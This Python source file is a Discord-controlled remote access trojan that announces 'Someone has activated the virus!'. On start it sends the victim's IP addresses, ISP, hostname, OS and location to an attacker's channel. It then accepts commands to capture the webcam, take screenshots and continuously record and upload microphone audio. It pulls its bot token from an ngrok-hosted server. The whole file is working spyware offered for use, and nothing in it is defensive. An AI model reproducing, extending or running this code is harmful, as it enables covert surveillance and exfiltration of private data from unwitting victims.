import discord
import os
import logging
import socket
import sys
from discord.ext import commands
import cv2
import time
import numpy as np
from PIL import ImageGrab
import pyautogui
import mss
import platform
import requests
import wave
import sounddevice as sd
import daemon
import tempfile
import subprocess
import asyncio


logging.basicConfig(
    filename="dbot.log",
    encoding="utf-8",
    level=logging.INFO
)

# Enable intents
intents = discord.Intents.default()
intents.message_content = True
playing = False
temp = tempfile.gettempdir()
# Use bot instead of client
bot = commands.Bot(command_prefix="?", intents=intents)

def capture():
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if not ret:
        logging.error("failed to capture image")
        return
    if platform.system().lower() == "windows": 
        cv2.imwrite(fr"screenshot.png", frame)
        cam.release()
        return cam
    else:
        cv2.imwrite("screenshot.png", frame)
        cam.release()
        return cam

def desktop():
    if platform.system().lower() == "windows":
        screenshot = ImageGrab.grab()
        screenshot.save(fr"desktop.png")
        return screenshot
    else:
        with mss.mss() as sct:
            screenshot = sct.shot(output="desktop.png")
        return screenshot

def record(output="audio.wav", duration=30, rate=44100, channels=1):
    data = sd.rec(int(duration * rate), samplerate=rate, channels=channels, dtype=np.int16)
    sd.wait()

    with wave.open(output, 'wb') as wf:
        wf.setnchannels(channels)
        wf.setsampwidth(2)
        wf.setframerate(rate)
        wf.writeframes(data.tobytes())

    return output
    
    

def getinfo(isp_info=False, city_info=False, country_info=False):
    response = requests.get("https://ipinfo.io/json")

    if response.status_code == 200:
        data = response.json()
        isp = data.get("org", "Unknown ISP")
        city = data.get("city", "Unknown city")
        country = data.get("country", "Unknown country")
        if isp_info:
            return isp
        elif city_info:
            return city
        elif country_info:
            return country
    else:
        return "Error: Unable to fetch ISP info"
        logging.error(response.status_code, response.text)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    ip = socket.gethostbyname(socket.gethostname())
    system = platform.system()
    isp = getinfo(isp_info=True)
    city = getinfo(city_info=True)
    country = getinfo(country_info=True)
    ipv4 = requests.get("https://icanhazip.com").text.strip()
    ipv6 = requests.get("https://icanhazip.com").text.strip()
    hostname = socket.gethostname()
    channel_id = 1275570323701633144
    channel = bot.get_channel(channel_id)
    if channel:
        await channel.send(f"""# Someone has  activated the virus!
IP: `{ip}`
ISP: `{isp}`
IPv4: `{ipv4}`
IPv6: `{ipv6}`
Hostname: `{hostname}`
OS: `{system}`
City: `{city}`
Country: `{country}`
                            """)        

@bot.command()
async def fetch(ctx):
    ip = socket.gethostbyname(socket.gethostname())
    await ctx.send(f"User IP: `{ip}`")  # Send response to Discord

@bot.command()
async def webcam(ctx, delay: int = 0):
    try:
        await asyncio.sleep(delay)
        capture()
        image = "screenshot.png"
        if os.path.exists("screenshot.png"):
            await ctx.send(file=discord.File(image))
            os.remove("screenshot.png")
    except Exception as e:
        logging.error(f"Webcam command error: {e}")
        await ctx.send("An error occurred while capturing the webcam.")

@bot.command()
async def screenshot(ctx, args=0):
    time.sleep(args)
    image = desktop()
    await ctx.send(file=discord.File(image))
    if os.path.exists("desktop.png"):
        os.remove("desktop.png")
    else:
        pass

@bot.command()
async def start_recording(ctx):
    global playing
    if playing:
        await ctx.send("Already recording")
        return
    
    playing = True
    await ctx.send("Starting recording")
    while playing:
        audio = record()
        await ctx.send(file=discord.File(audio))
        os.remove(audio)
    

@bot.command()
async def stop_recording(ctx):
    global playing
    if not playing:
        await ctx.send("currently not recording")
        return
    playing = False
    await ctx.send("Stopped recording")

@bot.command()
async def kill(ctx):
    await ctx.send("Killing...")
    for file in ["desktop.png", "audio.wav", "screenshot.png"]:
        if os.path.exists(file):
            os.remove(file)
    exit(0)
    
# Get Token
response = requests.get("https://snail-unique-katydid.ngrok-free.app/get-token?key=gAAAAABnpQA40Ml9P2SMcoBxblf9f15bO0DjQFum8U6AHcZWwMQ8J482sIN7efOjlcpGWfA4oo037pHxx!hSsqPGOxFd@H_q5fqukZvVyMx5ARF2vvsPPpc3DA-g3et0TAHpE=")
code = str(response.status_code)
if code.startswith("4") or code.startswith("5"):
    print("got an error while fetching token.")
    logging.error(response.status_code)
    logging.error(response.text)
else:
    pass
text = response.text.split("\n")
TOKEN = text[0]

if TOKEN is None:
    print("Error: Token not set.")
    sys.exit(1)  # Stop execution

if __name__ == "__main__":
    if platform.system().lower() == "windows":
        try:
            bot.run(TOKEN)
        except discord.errors.LoginFailure as e:
            print("Failure to login in")
            logging.error(e)
        except discord.errors.HTTPException as e:
            print(fr"Error: {e}")
            logging.error(e)
    else:
        try:
            bot.run(TOKEN)
        except discord.errors.LoginFailure as e:
            print("Failure in login in")
            logging.error(e)
        except discord.errors.HTTPException as e:
            print("Error: unathorized")
            logging.error(e)
